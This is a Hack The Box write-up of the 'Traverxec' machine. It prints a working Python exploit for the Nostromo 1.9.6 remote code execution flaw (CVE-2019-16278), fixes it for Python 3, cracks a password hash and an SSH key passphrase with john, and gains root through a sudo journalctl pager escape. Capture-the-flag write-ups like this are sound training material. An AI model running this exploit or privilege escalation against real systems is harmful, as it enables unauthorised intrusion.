---
layout: post
title:  "HTB Writeup [Linux - Easy] - Traverxec"
published: false
---

![](/assets/Traverxec/Traverxec.png)

### Summary
- Traverxec is a linux machine hosting a web server called Nostromo and has SSH port open.
- The response headers from the webserver reveal its version which happens to be vulnerable to a Remote Code Execution vulnerability.
- After exploiting that, we get a shell as the `www-data` user. And, when going through the files in the webroot, we find Nostromo's configuration.
- It reveals an accessible area within the `david` user's home directory. We find a passphrase-protected private SSH key there.
- We manage to crack it using `john` and are able to login using SSH.
- In `david`'s home path, we find a folder containing a Bash script that issues a `journalctl` command with `sudo` privileges. We exploit that to get a shell as root.

---

### NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

from `nmap`'s output, we notice that the web server is Nostromo version 1.9.6.

but before we check for exploits, we'll first take a look at the website.

### The website
![](/assets/Traverxec/website-home-page.jpg)

static content for the most.

### Searching and Fixing Exploits
using `searchsploit` gets us two identical matches.

![](/assets/Traverxec/searchsploit.jpg)

looking at the exploit code:

```python
#!/usr/bin/env python

import sys
import socket
help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)

    except IndexError:
        print(help_menu)
```

seems straightforward. Just a POST request. Let's give it a try:

![](/assets/Traverxec/exploit-error.jpg)

an error occurs. Nothing to worry about. we check it out on Google to find this on Stack Overflow:

![](/assets/Traverxec/stack-overflow-answer.jpg)

following that, we modify the code

```python
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload.encode())  # previously soc.send(payload)
    receive = connect(soc)
    print(receive)
```

then rerun the exploit:

![](/assets/Traverxec/no-feedback-exploit.jpg)

no feedback whatsoever XD

so we switch up the command to verify if we have code execution or not.

![](/assets/Traverxec/code-execution-verified.jpg)

we're good :) let's get in with a reverse shell.

![](/assets/Traverxec/got-shell.jpg)

before going any further, I like to improve my shell. it's done in the below steps

```bash
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press CTRL + Z
stty raw -echo
fg
# Press Enter twice
export SHELL=/bin/bash && export TERM=xterm-256color
# that's the size that fits my terminal. you can find yours with "stty size"
stty rows 51 columns 228
```

### The Nostromo config file
Right after logging in, I go into the `/var/nostromo` folder. I find this configuration file in the `conf` folder.

![](/assets/Traverxec/nostromo-conf.jpg)

A couple of interesting things show up:
- a username: david
- an `.htpasswd` file
- and a section on `HOMEDIRS`

`david` turned out to be a local user on the system

![](/assets/Traverxec/david-passwd.jpg)

the `.htpasswd` file contained a hash. we cracked it with `john` and got a password:

![](/assets/Traverxec/htpasswd-cracked.jpg)

But that password didn't work for either `root` or `david`.

![](/assets/Traverxec/no-cred-reuse-for-htpassword.jpg)

we keep it around just in case.

### Understanding the HOMEDIRS feature
previously, we attempted to list the contents of `david`'s profile but got access denied.

![](/assets/Traverxec/david-perm-denied.jpg)

since the `HOMEDIRS` feature would give us access into `david`'s directory, we take a quick look at the online [documentation](https://www.nazgul.ch/dev/nostromo_man.html) to understand how to use it:

note: you can edit the CSS for the man page using the Chrome Dev Tools to make it clearer for reading

![](/assets/Traverxec/editing-site-css-for-clarity.jpg)

We find that we can access a user's folder using the `~` followed by the username.

another thing is: users can define a certain directory to be shared through the `homedirs_public` option.

![](/assets/Traverxec/homedirs_explained.jpg)

we saw that one in `nhttpd.conf`

![](/assets/Traverxec/public_www.jpg)

let's first check the home directory from the outside

![](/assets/Traverxec/home-dir-website.jpg)

there's nothing in both the web page and the source code.

the result was the same with a `gobuster` brute force.

Since the `public_www` folder has nowhere to be in except in `david`'s home directory, we tried to blindly change into it.

![](/assets/Traverxec/public_www-violated.jpg)

And it worked! And moreover, we found something that could give us access.

we copy it to `/tmp` and extract it. We find a protected `id_rsa` that we need to crack:

![](/assets/Traverxec/id_rsa_found.jpg)

we first change it to a hash using `ssh2john` and crack it using `john` to get a password: "hunter"

![](/assets/Traverxec/id_rsa_cracked.jpg)

and we access the machine as `david`

![](/assets/Traverxec/ssh-as-david.jpg)

### Exploiting SUDO journalctl for Privesc
Right after loggin in, we see a folder that sticks out: `bin`

it had a script `server-status.sh` and a file called `server-stats.head`

![](/assets/Traverxec/bin-folder-plus-script.jpg)

looking at their contents:

![](/assets/Traverxec/bin-files-breakdown.jpg)

they are all commands for checking the status of the Nostromo server

the exploitable part here is the sudo part:

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

because `journalctl` can be turned into a shell. A quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) can confirm that.

![](/assets/Traverxec/gtfo-bins-journalctl.jpg)

that's because in "invokes the default pager" which can be `less`, `more`, `nano` or `vim`. which all can be broken out of to a shell.

Let's first run the script to see if it asks for a password or not.

![](/assets/Traverxec/script-test-run.jpg)

alright, this means that the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` is available for `david` without a password being provided.

But we won't get a pager when running in such a wide terminal:

![](/assets/Traverxec/no-pager-invoked.jpg)

But when we make it smaller ;)

```bash
stty rows 20 columns 20
```

![](/assets/Traverxec/pager-invoked.jpg)

we get a `less` pager which we can turn into a bash shell with `!/bin/bash`

![](/assets/Traverxec/rooted.jpg)

Owned :D